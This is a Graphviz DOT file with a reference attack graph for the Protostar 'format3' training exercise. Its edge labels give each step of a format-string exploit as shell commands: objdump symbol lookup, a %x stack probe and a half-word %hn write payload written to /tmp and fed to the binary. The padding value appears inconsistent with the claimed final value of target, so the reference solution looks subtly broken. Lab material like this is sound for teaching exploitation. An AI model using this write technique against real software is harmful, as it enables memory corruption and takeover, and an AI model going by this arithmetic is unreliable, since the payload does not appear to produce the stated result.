digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Format Three"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="target address recovered"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Stack offset for stdin payload identified"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Split half-word write payload built"];
  node3 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="target set to 0x01025544"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -t /opt/protostar/bin/format3 | grep \" target$\""];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"AAAA.%x.%x.%x.%x.%x.%x.%x.%x\"' | /opt/protostar/bin/format3"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"\\xf4\\x96\\x04\\x08\\xf6\\x96\\x04\\x08%21828x%4$hn%43966x%5$hn\"' > /tmp/format3.in"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/format3 < /tmp/format3.in"];
}
